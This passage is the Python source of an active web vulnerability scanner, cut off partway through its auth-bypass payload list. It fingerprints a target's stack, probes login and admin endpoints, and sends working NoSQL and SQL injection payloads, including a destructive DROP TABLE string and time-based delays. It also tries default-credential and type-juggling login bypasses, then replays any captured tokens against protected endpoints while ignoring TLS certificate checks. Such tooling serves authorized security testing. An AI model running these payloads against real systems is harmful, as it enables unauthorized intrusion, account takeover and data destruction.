"""Active scanner module for real target reconnaissance and vulnerability testing."""
from __future__ import annotations

import hashlib
import json
import re
import ssl
import urllib.parse
import warnings
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any

# Suppress SSL warnings for targets with self-signed certs
warnings.filterwarnings("ignore", message="Unverified HTTPS request")

# Use urllib for zero dependencies, but prefer requests if available
try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    import urllib.request
    import urllib.error

# MISP Warning List Filter for false positive reduction
try:
    import sys
    sys.path.insert(0, str(__file__).rsplit("src", 1)[0] + "tools")
    from warning_list_filter import MISPWarningListFilter, WarningMatch
    HAS_WARNING_FILTER = True
except ImportError:
    HAS_WARNING_FILTER = False
    MISPWarningListFilter = None
    WarningMatch = None


@dataclass
class HttpResponse:
    """Captured HTTP response."""
    status_code: int
    headers: dict[str, str]
    body: str
    elapsed_ms: float
    error: str = ""


@dataclass
class EndpointInfo:
    """Discovered endpoint information."""
    url: str
    method: str
    parameters: list[str] = field(default_factory=list)
    content_type: str = ""
    requires_auth: bool = False


@dataclass
class TechStack:
    """Detected technology stack."""
    server: str = ""
    framework: str = ""
    language: str = ""
    database: str = ""
    headers: dict[str, str] = field(default_factory=dict)
    cookies: list[str] = field(default_factory=list)


@dataclass
class VulnTestResult:
    """Result of a vulnerability test."""
    vuln_type: str
    payload: str
    target_url: str
    request_data: str
    response: HttpResponse
    is_vulnerable: bool
    confidence: float
    evidence: str
    evidence_hash: str = ""


@dataclass 
class ScanResult:
    """Complete scan result for a target."""
    target: str
    timestamp: str
    tech_stack: TechStack
    endpoints: list[EndpointInfo]
    vulnerabilities: list[VulnTestResult]
    raw_responses: list[dict[str, Any]] = field(default_factory=list)


@dataclass
class BaselineResponse:
    """Baseline response for comparison."""
    status_code: int
    body_length: int
    body_hash: str
    has_token: bool
    has_user_data: bool
    is_login_page: bool
    content_type: str


class ActiveScanner:
    """Active scanner for real target reconnaissance and vulnerability testing."""
    
    def __init__(self, timeout: int = 10, verify_ssl: bool = False, verbose: bool = True):
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.verbose = verbose
        self._baselines: dict[str, BaselineResponse] = {}  # Cache baselines per endpoint
        self._protected_endpoints: list[str] = []  # Endpoints requiring auth
        self._filtered_false_positives: list[dict] = []  # Track what was filtered
        
        # Initialize MISP Warning List Filter for false positive reduction
        if HAS_WARNING_FILTER:
            self._warning_filter = MISPWarningListFilter()
            self._log("[FP Filter] MISP Warning List Filter: ENABLED")
        else:
            self._warning_filter = None
        
        if HAS_REQUESTS:
            self.session = requests.Session()
            # Set adapter with lower max retries for faster failure
            adapter = requests.adapters.HTTPAdapter(max_retries=1)
            self.session.mount('http://', adapter)
            self.session.mount('https://', adapter)
        else:
            self.session = None
    
    def _log(self, message: str):
        """Print verbose log."""
        if self.verbose:
            print(f"    {message}")
    
    def _check_false_positive(self, indicator: str, indicator_type: str = "auto") -> tuple[bool, str]:
        """
        Check if an indicator is a known false positive using MISP Warning Lists.
        
        Args:
            indicator: The indicator to check (IP, domain, URL, hash)
            indicator_type: Type of indicator ("ip", "domain", "url", "hash", "auto")
        
        Returns:
            Tuple of (is_false_positive, reason)
        """
        if not self._warning_filter:
            return False, ""
        
        result = self._warning_filter.check_indicator(indicator, indicator_type)
        if result.matched and result.confidence >= 0.5:
            return True, result.description
        return False, ""
    
    def _filter_scan_target(self, target_url: str) -> tuple[bool, str]:
        """
        Check if target URL should be skipped (belongs to known benign infrastructure).
        
        Returns:
            Tuple of (should_skip, reason)
        """
        if not self._warning_filter:
            return False, ""
        
        # Extract domain from URL
        try:
            parsed = urllib.parse.urlparse(target_url)
            domain = parsed.netloc
            if ":" in domain:
                domain = domain.split(":")[0]
            
            # Check domain
            result = self._warning_filter.check_domain(domain)
            if result.matched and result.confidence >= 0.8:
                return True, f"Target is known benign infrastructure: {result.description}"
            
            # Could also check if domain resolves to cloud/cdn IP
            # But that requires DNS lookup which we skip for speed
            
        except Exception:
            pass
        
        return False, ""

    def _capture_baseline(self, endpoint_url: str) -> BaselineResponse:
        """Capture baseline response with invalid credentials for comparison."""
        if endpoint_url in self._baselines:
            return self._baselines[endpoint_url]
        
        self._log(f"[Baseline] Capturing baseline for {endpoint_url}")
        
        # Use random invalid credentials
        import uuid
        random_user = f"invalid_user_{uuid.uuid4().hex[:8]}"
        random_pass = f"invalid_pass_{uuid.uuid4().hex[:8]}"
        
        resp = self._make_request("POST", endpoint_url, json_data={
            "username": random_user,
            "password": random_pass
        })
        
        body_lower = resp.body.lower()
        
        baseline = BaselineResponse(
            status_code=resp.status_code,
            body_length=len(resp.body),
            body_hash=hashlib.md5(resp.body.encode()).hexdigest(),
            has_token=any(tok in body_lower for tok in ["token", "jwt", "access_token", "bearer"]),
            has_user_data=any(tok in body_lower for tok in ['"user":', '"email":', '"id":', '"role":', '"profile":']),
            is_login_page=any(x in body_lower for x in ["<title>log", "login", "password", "sign in", "<!doctype"]),
            content_type=resp.headers.get("Content-Type", "")
        )
        
        self._log(f"[Baseline] Status: {baseline.status_code}, Length: {baseline.body_length}, IsLoginPage: {baseline.is_login_page}")
        
        self._baselines[endpoint_url] = baseline
        return baseline
    
    def _compare_with_baseline(self, baseline: BaselineResponse, resp: HttpResponse) -> dict:
        """Compare response with baseline to detect significant differences."""
        body_lower = resp.body.lower()
        
        comparison = {
            "status_changed": resp.status_code != baseline.status_code,
            "length_diff": abs(len(resp.body) - baseline.body_length),
            "length_diff_percent": (abs(len(resp.body) - baseline.body_length) / max(baseline.body_length, 1)) * 100,
            "body_hash_changed": hashlib.md5(resp.body.encode()).hexdigest() != baseline.body_hash,
            "new_token_appeared": not baseline.has_token and any(tok in body_lower for tok in ["token", "jwt", "access_token"]),
            "new_user_data": not baseline.has_user_data and any(tok in body_lower for tok in ['"user":', '"email":', '"id":']),
            "bypassed_login_page": baseline.is_login_page and "<!doctype" not in body_lower.replace(" ", ""),
        }
        
        # Calculate significance score
        score = 0
        if comparison["status_changed"] and resp.status_code == 200:
            score += 30
        if comparison["new_token_appeared"]:
            score += 40
        if comparison["new_user_data"]:
            score += 30
        if comparison["bypassed_login_page"]:
            score += 25
        if comparison["length_diff_percent"] > 50:
            score += 15
        
        comparison["significance_score"] = score
        comparison["is_significant"] = score >= 30
        
        return comparison
    
    def _extract_token(self, resp: HttpResponse) -> str | None:
        """Extract authentication token from response."""
        try:
            data = json.loads(resp.body)
            for key in ["token", "access_token", "jwt", "accessToken", "id_token", "auth_token"]:
                if key in data:
                    return data[key]
            # Nested check
            if "data" in data and isinstance(data["data"], dict):
                for key in ["token", "access_token", "jwt"]:
                    if key in data["data"]:
                        return data["data"][key]
        except (json.JSONDecodeError, TypeError):
            # Try regex extraction
            patterns = [
                r'"(?:token|access_token|jwt)":\s*"([^"]+)"',
                r'Bearer\s+([A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*)',
            ]
            for pattern in patterns:
                match = re.search(pattern, resp.body)
                if match:
                    return match.group(1)
        return None
    
    def _validate_token(self, base_url: str, token: str) -> tuple[bool, str]:
        """Validate if extracted token grants actual access."""
        protected_endpoints = [
            "/api/v1/profile", "/api/v1/me", "/api/v1/user", "/api/v1/admin",
            "/api/profile", "/api/me", "/api/user", "/profile", "/me", "/admin/dashboard"
        ]
        
        for ep in protected_endpoints:
            url = f"{base_url}{ep}"
            
            # Request without token
            resp_without = self._make_request("GET", url)
            
            # Request with token
            resp_with = self._make_request("GET", url, headers={
                "Authorization": f"Bearer {token}"
            })
            
            # Check if token made a difference
            if resp_without.status_code in (401, 403) and resp_with.status_code == 200:
                # Token granted access
                try:
                    data = json.loads(resp_with.body)
                    if isinstance(data, dict) and any(k in data for k in ["user", "email", "id", "username"]):
                        return True, f"Token validated! Grants access to {ep} with user data: {list(data.keys())[:5]}"
                except:
                    pass
                return True, f"Token validated! Changed {ep} from {resp_without.status_code} to {resp_with.status_code}"
            
            # Check if 200 response contains actual data (not just login page)
            if resp_with.status_code == 200:
                body_lower = resp_with.body.lower()
                is_login_page = any(x in body_lower for x in ["<form", "password", "login", "sign in"])
                
                if not is_login_page:
                    try:
                        data = json.loads(resp_with.body)
                        if isinstance(data, dict) and data:
                            return True, f"Token returns data from {ep}: {list(data.keys())[:3]}"
                    except:
                        if len(resp_with.body) > 100 and "<!doctype" not in body_lower:
                            return True, f"Token returns non-HTML data from {ep}"
        
        return False, "Token could not be validated - may be invalid or endpoints not accessible"
        
    def _make_request(
        self, 
        method: str, 
        url: str, 
        headers: dict | None = None,
        data: Any = None,
        json_data: Any = None
    ) -> HttpResponse:
        """Make HTTP request and capture response."""
        import time
        start = time.time()
        
        default_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json, text/html, */*",
            "Accept-Language": "en-US,en;q=0.9",
        }
        if headers:
            default_headers.update(headers)
            
        try:
            if HAS_REQUESTS:
                resp = self.session.request(
                    method=method,
                    url=url,
                    headers=default_headers,
                    data=data,
                    json=json_data,
                    timeout=(self.timeout, self.timeout),  # (connect, read) timeouts
                    verify=self.verify_ssl,
                    allow_redirects=True,
                    stream=False  # Don't stream - read entire response
                )
                elapsed = (time.time() - start) * 1000
                # Limit response body size to avoid hanging on large responses
                body = resp.text[:50000] if len(resp.text) > 50000 else resp.text
                return HttpResponse(
                    status_code=resp.status_code,
                    headers=dict(resp.headers),
                    body=body,
                    elapsed_ms=elapsed
                )
            else:
                # Fallback to urllib
                req_data = None
                if json_data:
                    req_data = json.dumps(json_data).encode('utf-8')
                    default_headers["Content-Type"] = "application/json"
                elif data:
                    req_data = data.encode('utf-8') if isinstance(data, str) else data
                    
                req = urllib.request.Request(url, data=req_data, headers=default_headers, method=method)
                ctx = ssl.create_default_context()
                if not self.verify_ssl:
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    
                with urllib.request.urlopen(req, timeout=self.timeout, context=ctx) as resp:
                    elapsed = (time.time() - start) * 1000
                    return HttpResponse(
                        status_code=resp.status,
                        headers=dict(resp.headers),
                        body=resp.read().decode('utf-8', errors='replace'),
                        elapsed_ms=elapsed
                    )
        except Exception as e:
            elapsed = (time.time() - start) * 1000
            return HttpResponse(
                status_code=0,
                headers={},
                body="",
                elapsed_ms=elapsed,
                error=str(e)
            )
    
    def _hash_evidence(self, data: str) -> str:
        """Generate SHA256 hash of evidence."""
        return f"sha256:{hashlib.sha256(data.encode()).hexdigest()[:16]}"
    
    def scan_target(self, target_url: str) -> ScanResult:
        """Perform full scan on target with smart test selection."""
        timestamp = datetime.now().isoformat()
        
        # Reset tracking
        self._filtered_false_positives = []
        
        # Normalize URL
        if not target_url.startswith(('http://', 'https://')):
            target_url = f"https://{target_url}"
        target_url = target_url.rstrip('/')
        
        # Check if target is known benign infrastructure (optional warning)
        is_benign, benign_reason = self._filter_scan_target(target_url)
        if is_benign and self.verbose:
            print(f"[!] WARNING: {benign_reason}")
            print("[!] Scanning known legitimate infrastructure may be against ToS")
        
        # Phase 1: Reconnaissance
        if self.verbose:
            print("\n[*] Phase 1: Reconnaissance & Tech Stack Detection...")
        tech_stack = self._detect_tech_stack(target_url)
        endpoints = self._discover_endpoints(target_url)
        
        if self.verbose:
            print(f"    Server: {tech_stack.server or 'Unknown'}")
            print(f"    Framework: {tech_stack.framework or 'Unknown'}")
            print(f"    Language: {tech_stack.language or 'Unknown'}")
            print(f"    Database: {tech_stack.database or 'Unknown'}")
            print(f"    Endpoints found: {len(endpoints)}")
        
        # Phase 2: Smart Test Selection based on Tech Stack
        test_plan = self._create_test_plan(tech_stack, endpoints)
        
        if self.verbose:
            print(f"\n[*] Phase 2: Smart Test Selection (based on detected stack)")
            print(f"    Priority tests: {', '.join(test_plan['priority'])}")
            print(f"    Secondary tests: {', '.join(test_plan['secondary'])}")
            print(f"    Skipped tests: {', '.join(test_plan['skip'])} (not relevant)")
        
        # Phase 3: Execute Tests in Priority Order
        if self.verbose:
            print("\n[*] Phase 3: Vulnerability Testing with Auto-Verification...")
        
        vulnerabilities = []
        raw_responses = []
        
        # Run priority tests first
        for test_type in test_plan['priority']:
            results = self._run_test_type(test_type, target_url, endpoints, tech_stack)
            vulnerabilities.extend(results)
            
            # Adaptive: if we find something, explore related tests
            confirmed = [v for v in results if v.is_vulnerable]
            if confirmed and self.verbose:
                print(f"    [!] Found {len(confirmed)} {test_type} vulnerabilities - exploring related vectors...")
        
        # Run secondary tests
        for test_type in test_plan['secondary']:
            results = self._run_test_type(test_type, target_url, endpoints, tech_stack)
            vulnerabilities.extend(results)
        
        # Print verification summary
        if self.verbose:
            confirmed = [v for v in vulnerabilities if v.is_vulnerable]
            potential = [v for v in vulnerabilities if not v.is_vulnerable and v.confidence > 0.3]
            print(f"\n[*] Auto-Verification Summary:")
            print(f"    [+] VERIFIED vulnerabilities: {len(confirmed)}")
            print(f"    [?] Needs manual verification: {len(potential)}")
            print(f"    [-] FALSE POSITIVES filtered: {len(self._filtered_false_positives)}")
            
            if self._filtered_false_positives:
                print(f"\n[*] Filtered False Positives:")
                by_type = {}
                for fp in self._filtered_false_positives:
                    t = fp["type"]
                    if t not in by_type:
                        by_type[t] = []
                    by_type[t].append(fp)
                
                for vuln_type, items in by_type.items():
                    print(f"    {vuln_type}: {len(items)} payloads filtered")
                    if len(items) <= 3:
                        for item in items:
                            print(f"      - {item['reason']}")
        
        return ScanResult(
            target=target_url,
            timestamp=timestamp,
            tech_stack=tech_stack,
            endpoints=endpoints,
            vulnerabilities=vulnerabilities,
            raw_responses=raw_responses
        )
    
    def _create_test_plan(self, tech_stack: TechStack, endpoints: list[EndpointInfo]) -> dict:
        """
        Create smart test plan based on detected technology stack.
        
        Returns dict with:
          - priority: tests to run first (high relevance)
          - secondary: tests to run after (medium relevance)
          - skip: tests not relevant for this stack
        """
        priority = []
        secondary = []
        skip = []
        
        lang = (tech_stack.language or "").lower()
        fw = (tech_stack.framework or "").lower()
        db = (tech_stack.database or "").lower()
        server = (tech_stack.server or "").lower()
        
        # Check for GraphQL endpoint
        has_graphql = any("/graphql" in e.url.lower() for e in endpoints)
        
        # Check for file upload endpoints
        has_upload = any(
            "upload" in e.url.lower() or 
            "file" in e.url.lower() or
            "image" in e.url.lower()
            for e in endpoints
        )
        
        # Check for URL parameters (potential SSRF, redirect targets)
        has_url_params = any(
            any(p.lower() in ["url", "redirect", "next", "return", "callback", "dest", "target", "link", "path"]
                for p in e.parameters)
            for e in endpoints
        )
        
        # === Database-specific tests ===
        if "mongo" in db:
            priority.append("nosql")
            skip.append("sqli")
        elif db in ["mysql", "postgres", "postgresql", "mssql", "oracle", "sqlite"]:
            priority.append("sqli")
            skip.append("nosql")
        else:
            # Unknown DB - test both
            secondary.append("sqli")
            secondary.append("nosql")
        
        # === Language/Framework-specific tests ===
        
        # PHP
        if "php" in lang or "laravel" in fw or "wordpress" in fw or "drupal" in fw:
            priority.extend(["lfi", "rce", "type_juggling", "deserialization"])
            if "wordpress" in fw:
                priority.append("wordpress")  # WP-specific vulnerabilities
        
        # Python
        elif "python" in lang or "django" in fw or "flask" in fw or "fastapi" in fw:
            priority.extend(["ssti", "deserialization"])
            if "django" in fw:
                secondary.append("sqli")  # Django ORM bypass
            if "flask" in fw or "jinja" in fw:
                priority.append("ssti")  # Jinja2 SSTI
        
        # Node.js
        elif "node" in lang or "express" in fw or "next" in fw:
            priority.extend(["prototype_pollution", "nosql", "ssti"])
            secondary.append("ssrf")
        
        # Java
        elif "java" in lang or "spring" in fw or "struts" in fw or "tomcat" in server:
            priority.extend(["deserialization", "xxe", "ssti"])
            if "struts" in fw:
                priority.append("rce")  # Struts RCE is common
        
        # .NET
        elif "asp" in lang or ".net" in lang or "iis" in server:
            priority.extend(["deserialization", "xxe", "sqli"])
        
        # Ruby
        elif "ruby" in lang or "rails" in fw:
            priority.extend(["ssti", "deserialization", "mass_assignment"])
        
        # === Universal tests (always relevant) ===
        if "auth" not in [t for t in priority + secondary]:
            priority.append("auth")  # Auth bypass
        
        if "xss" not in [t for t in priority + secondary]:
            secondary.append("xss")
        
        if "jwt" not in [t for t in priority + secondary]:
            secondary.append("jwt")
        
        # === Feature-specific tests ===
        if has_graphql:
            priority.append("graphql")
        
        if has_upload:
            priority.append("file_upload")
        
        if has_url_params:
            priority.extend(["ssrf", "open_redirect"])
        else:
            secondary.extend(["ssrf", "open_redirect"])
        
        # === Server-specific ===
        if "nginx" in server:
            secondary.append("crlf")  # Header injection
        
        if "apache" in server:
            secondary.extend(["crlf", "lfi"])
        
        # === Additional tests ===
        if "cors" not in [t for t in priority + secondary]:
            secondary.append("cors")
        
        # Remove duplicates while preserving order
        priority = list(dict.fromkeys(priority))
        secondary = list(dict.fromkeys([t for t in secondary if t not in priority]))
        
        return {
            "priority": priority,
            "secondary": secondary,
            "skip": skip
        }
    
    def _run_test_type(self, test_type: str, target_url: str, 
                       endpoints: list[EndpointInfo], tech_stack: TechStack) -> list:
        """Execute a specific test type and return results."""
        results = []
        
        if self.verbose:
            print(f"\n[*] Testing: {test_type.upper()}")
        
        if test_type == "nosql":
            for endpoint in endpoints:
                results.extend(self._test_nosql_injection(endpoint))
        
        elif test_type == "sqli":
            for endpoint in endpoints:
                results.extend(self._test_sql_injection(endpoint))
        
        elif test_type == "auth":
            for endpoint in endpoints:
                results.extend(self._test_auth_bypass(endpoint))
        
        elif test_type == "jwt":
            results.extend(self._test_jwt_vulnerabilities(target_url))
        
        elif test_type == "xss":
            results.extend(self._test_xss(target_url, endpoints))
        
        elif test_type == "ssrf":
            results.extend(self._test_ssrf(target_url, endpoints))
        
        elif test_type == "ssti":
            results.extend(self._test_ssti(target_url, endpoints, tech_stack))
        
        elif test_type == "lfi":
            results.extend(self._test_lfi(target_url, endpoints))
        
        elif test_type == "xxe":
            results.extend(self._test_xxe(target_url, endpoints))
        
        elif test_type == "rce":
            results.extend(self._test_rce(target_url, endpoints))
        
        elif test_type == "crlf":
            results.extend(self._test_crlf(target_url, endpoints))
        
        elif test_type == "open_redirect":
            results.extend(self._test_open_redirect(target_url, endpoints))
        
        elif test_type == "cors":
            results.extend(self._test_cors(target_url))
        
        elif test_type == "graphql":
            results.extend(self._test_graphql(target_url, endpoints))
        
        elif test_type == "file_upload":
            results.extend(self._test_file_upload(target_url, endpoints))
        
        elif test_type == "prototype_pollution":
            results.extend(self._test_prototype_pollution(target_url, endpoints))
        
        elif test_type == "deserialization":
            results.extend(self._test_deserialization(target_url, endpoints, tech_stack))
        
        elif test_type == "type_juggling":
            results.extend(self._test_type_juggling(target_url, endpoints))
        
        elif test_type == "mass_assignment":
            results.extend(self._test_mass_assignment(target_url, endpoints))
        
        else:
            if self.verbose:
                print(f"    [!] Test type '{test_type}' not implemented yet")
        
        return results
    
    def _detect_tech_stack(self, base_url: str) -> TechStack:
        """Detect technology stack from headers and responses."""
        resp = self._make_request("GET", base_url)
        
        tech = TechStack()
        tech.headers = resp.headers
        
        # Server detection
        tech.server = resp.headers.get("Server", resp.headers.get("server", ""))
        
        # Framework detection from headers
        powered_by = resp.headers.get("X-Powered-By", resp.headers.get("x-powered-by", ""))
        if powered_by:
            tech.framework = powered_by
            if "express" in powered_by.lower():
                tech.language = "Node.js"
            elif "php" in powered_by.lower():
                tech.language = "PHP"
            elif "asp.net" in powered_by.lower():
                tech.language = "C#/.NET"
        
        # Framework detection from response body and headers
        body_lower = resp.body.lower()
        link_header = resp.headers.get("Link", "")
        
        # WordPress detection (check multiple indicators)
        if any([
            "wp-json" in link_header,
            "wp-content" in body_lower,
            "wp-includes" in body_lower,
            "wordpress" in body_lower,
            "wp-login" in body_lower,
        ]):
            tech.framework = "WordPress"
            tech.language = "PHP"
            tech.database = tech.database or "MySQL"
        elif "django" in body_lower or "csrfmiddlewaretoken" in body_lower:
            tech.framework = tech.framework or "Django"
            tech.language = tech.language or "Python"
        elif "laravel" in body_lower or "laravel_session" in resp.headers.get("Set-Cookie", "").lower():
            tech.framework = tech.framework or "Laravel"
            tech.language = tech.language or "PHP"
        elif "next" in resp.headers.get("X-Powered-By", "").lower():
            tech.framework = tech.framework or "Next.js"
            tech.language = tech.language or "Node.js"
        elif "express" in body_lower or "__express" in body_lower:
            tech.framework = tech.framework or "Express.js"
            tech.language = tech.language or "Node.js"
            
        # Cookie detection
        set_cookie = resp.headers.get("Set-Cookie", resp.headers.get("set-cookie", ""))
        if set_cookie:
            tech.cookies = [c.split(";")[0] for c in set_cookie.split(",")]
            
        # Database hints
        if "mongo" in body_lower or "mongodb" in body_lower:
            tech.database = "MongoDB"
        elif "mysql" in body_lower:
            tech.database = "MySQL"
        elif "postgres" in body_lower:
            tech.database = "PostgreSQL"
            
        return tech
    
    def _discover_endpoints(self, base_url: str) -> list[EndpointInfo]:
        """Discover API endpoints."""
        endpoints = []
        
        # Common API paths to probe
        common_paths = [
            "/api/v1/login",
            "/api/v1/auth",
            "/api/v1/users",
            "/api/v1/admin",
            "/api/v1/profile",
            "/api/login",
            "/api/auth",
            "/api/users",
            "/auth/login",
            "/auth/signin",
            "/login",
            "/signin",
            "/register",
            "/signup",
            "/admin",
            "/admin/login",
            "/user",
            "/users",
            "/profile",
            "/account",
            "/graphql",
            "/api/graphql",
            "/.well-known/openid-configuration",
            "/oauth/token",
            "/api/token",
            "/swagger.json",
            "/openapi.json",
            "/api-docs",
        ]
        
        for path in common_paths:
            url = f"{base_url}{path}"
            
            # Try GET first
            resp = self._make_request("GET", url)
            if resp.status_code not in (0, 404, 403):
                endpoint = EndpointInfo(
                    url=url,
                    method="GET",
                    content_type=resp.headers.get("Content-Type", ""),
                    requires_auth=resp.status_code == 401
                )
                endpoints.append(endpoint)
            
            # Try POST for auth endpoints
            if any(auth in path for auth in ["login", "auth", "signin", "token"]):
                resp = self._make_request("POST", url, json_data={"test": "probe"})
                if resp.status_code not in (0, 404):
                    # Try to detect parameters from error response
                    params = self._extract_params_from_response(resp.body)
                    endpoint = EndpointInfo(
                        url=url,
                        method="POST",
                        parameters=params or ["username", "password"],
                        content_type="application/json",
                        requires_auth=False
                    )
                    if endpoint not in endpoints:
                        endpoints.append(endpoint)
        
        return endpoints
    
    def _extract_params_from_response(self, body: str) -> list[str]:
        """Extract parameter names from error responses."""
        params = []
        
        # Common patterns in error messages
        patterns = [
            r'"(\w+)" is required',
            r'missing (?:required )?(?:field |parameter )?["\']?(\w+)',
            r'expected ["\']?(\w+)["\']?',
            r'["\'](\w+)["\'] must be',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, body, re.IGNORECASE)
            params.extend(matches)
            
        return list(set(params))
    
    def _test_nosql_injection(self, endpoint: EndpointInfo) -> list[VulnTestResult]:
        """Test for NoSQL injection vulnerabilities with proper verification."""
        results = []
        
        if endpoint.method != "POST":
            return results
        
        # Get baseline first
        baseline = self._capture_baseline(endpoint.url)
        base_url = endpoint.url.rsplit('/', 1)[0].rsplit('/login', 1)[0].rsplit('/auth', 1)[0]
            
        payloads = [
            # MongoDB operator injection
            {"$gt": ""},
            {"$ne": None},
            {"$ne": ""},
            {"$exists": True},
            {"$regex": ".*"},
            {"$where": "1==1"},
            # Array injection
            {"$in": ["admin", "root", "administrator"]},
        ]
        
        for payload in payloads:
            # Build request with payload in common auth fields
            test_data = {}
            for field in ["username", "email", "user", "login"]:
                test_data[field] = payload
            for field in ["password", "pass", "pwd"]:
                test_data[field] = payload
                
            resp = self._make_request("POST", endpoint.url, json_data=test_data)
            
            # Compare with baseline
            comparison = self._compare_with_baseline(baseline, resp)
            
            # Analyze response for success indicators
            is_vuln, confidence, evidence = self._analyze_nosql_response_v2(
                resp, payload, baseline, comparison, base_url
            )
            
            if is_vuln or confidence > 0.3:
                results.append(VulnTestResult(
                    vuln_type="NoSQL Injection",
                    payload=json.dumps(payload),
                    target_url=endpoint.url,
                    request_data=json.dumps(test_data),
                    response=resp,
                    is_vulnerable=is_vuln,
                    confidence=confidence,
                    evidence=evidence,
                    evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                ))
                
                if is_vuln:
                    break  # Found confirmed vuln, no need to test more
                    
        return results
    
    def _analyze_nosql_response_v2(
        self, 
        resp: HttpResponse, 
        payload: Any, 
        baseline: BaselineResponse,
        comparison: dict,
        base_url: str
    ) -> tuple[bool, float, str]:
        """Analyze response with baseline comparison and token validation."""
        if resp.error:
            return False, 0.0, f"Request failed: {resp.error}"
            
        body_lower = resp.body.lower()
        
        # Step 1: Check for MongoDB errors (definitive indicator)
        if any(err in body_lower for err in ["mongodb", "bson", "objectid", "mongoose", "$where", "mongo"]):
            self._log(f"[+] MongoDB error detected in response!")
            return True, 0.95, f"[VERIFIED] MongoDB error leaked in response"
        
        # Step 2: Check for token and validate it
        token = self._extract_token(resp)
        if token:
            self._log(f"[*] Token found, attempting validation...")
            is_valid, validation_msg = self._validate_token(base_url, token)
            if is_valid:
                self._log(f"[+] Token VALIDATED: {validation_msg}")
                return True, 0.98, f"[VERIFIED] NoSQL auth bypass - {validation_msg}"
            else:
                self._log(f"[-] Token found but invalid: {validation_msg}")
                # Token found but couldn't validate
                return False, 0.6, f"Token received but unverified: {validation_msg}"
        
        # Step 3: Compare with baseline
        if comparison["is_significant"]:
            if comparison["new_user_data"]:
                self._log(f"[+] New user data appeared (not in baseline)")
                return True, 0.85, f"[VERIFIED] Response contains user data not in baseline (score: {comparison['significance_score']})"
            if comparison["bypassed_login_page"]:
                self._log(f"[~] Login page structure changed")
                return True, 0.75, f"[LIKELY] Bypassed login page, response structure changed"
            if comparison["significance_score"] >= 40:
                self._log(f"[?] Significant diff (score: {comparison['significance_score']})")
                return False, 0.5, f"Significant response difference (score: {comparison['significance_score']}). Manual verification recommended."
        
        # Step 4: Check if same as baseline (false positive)
        if not comparison["body_hash_changed"] and resp.status_code == baseline.status_code:
            self._log(f"[-] FALSE POSITIVE: Response identical to baseline")
            self._filtered_false_positives.append({
                "type": "NoSQL Injection",
                "payload": str(payload),
                "reason": "Response identical to invalid credentials baseline"
            })
            return False, 0.1, f"[FALSE POSITIVE] Response identical to baseline - no injection effect"
        
        # Step 5: 200 but same login page structure
        if resp.status_code == 200 and baseline.is_login_page:
            if "<!doctype" in body_lower or "<html" in body_lower:
                self._log(f"[-] FALSE POSITIVE: 200 but still login page HTML")
                self._filtered_false_positives.append({
                    "type": "NoSQL Injection", 
                    "payload": str(payload),
                    "reason": "200 response is still login page HTML"
                })
                return False, 0.15, f"[FALSE POSITIVE] 200 response is still login page HTML"
        
        return False, 0.2, f"No clear indicators. Status: {resp.status_code}, Baseline: {baseline.status_code}"
    
    def _test_sql_injection(self, endpoint: EndpointInfo) -> list[VulnTestResult]:
        """Test for SQL injection vulnerabilities."""
        results = []
        
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "admin'--",
            "1' OR '1'='1",
            "1 OR 1=1",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "1; WAITFOR DELAY '0:0:5'--",
            "1' AND SLEEP(5)#",
        ]
        
        for payload in payloads:
            if endpoint.method == "POST":
                test_data = {
                    "username": payload,
                    "password": payload,
                }
                resp = self._make_request("POST", endpoint.url, json_data=test_data)
            else:
                # GET with query params
                url = f"{endpoint.url}?id={urllib.parse.quote(payload)}"
                resp = self._make_request("GET", url)
            
            is_vuln, confidence, evidence = self._analyze_sqli_response(resp, payload)
            
            if is_vuln or confidence > 0.3:
                results.append(VulnTestResult(
                    vuln_type="SQL Injection",
                    payload=payload,
                    target_url=endpoint.url,
                    request_data=json.dumps(test_data) if endpoint.method == "POST" else url,
                    response=resp,
                    is_vulnerable=is_vuln,
                    confidence=confidence,
                    evidence=evidence,
                    evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                ))
                
                if is_vuln:
                    break
                    
        return results
    
    def _analyze_sqli_response(self, resp: HttpResponse, payload: str) -> tuple[bool, float, str]:
        """Analyze response for SQL injection indicators."""
        if resp.error:
            return False, 0.0, f"Request failed: {resp.error}"
            
        body_lower = resp.body.lower()
        
        # Error-based SQL injection indicators
        sql_errors = [
            "sql syntax", "mysql", "sqlite", "postgresql", "oracle",
            "syntax error", "unterminated", "quoted string",
            "odbc", "jdbc", "sqlstate", "sql server",
            "you have an error in your sql",
        ]
        
        for err in sql_errors:
            if err in body_lower:
                return True, 0.9, f"SQL error detected: '{err}' in response"
        
        # Auth bypass indicators
        if resp.status_code == 200:
            if any(tok in body_lower for tok in ["token", "jwt", "session", "welcome", "dashboard"]):
                return True, 0.85, f"Possible auth bypass. Status: {resp.status_code}"
                
        # Time-based detection would need response time comparison
        if "sleep" in payload.lower() or "waitfor" in payload.lower():
            if resp.elapsed_ms > 4500:  # Close to 5 second delay
                return True, 0.8, f"Time-based SQLi detected. Response time: {resp.elapsed_ms}ms"
        
        return False, 0.1, f"No SQL injection indicators. Status: {resp.status_code}"
    
    def _test_auth_bypass(self, endpoint: EndpointInfo) -> list[VulnTestResult]:
        """Test for authentication bypass vulnerabilities with proper verification."""
        results = []
        
        if endpoint.method != "POST" or "login" not in endpoint.url.lower():
            return results
        
        # Get baseline first
        baseline = self._capture_baseline(endpoint.url)
        base_url = endpoint.url.rsplit('/', 1)[0].rsplit('/login', 1)[0].rsplit('/auth', 1)[0]
            
        bypass_payloads = [
            # Type juggling
            {"username": "admin", "password": True},
            {"username": "admin", "password": 1},
            {"username": "admin", "password": []},
            {"username": "admin", "password": {"$gt": ""}},
            # Empty/null
            {"username": "admin", "password": ""},
            {"username": "admin", "password": None},
            # Default creds
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
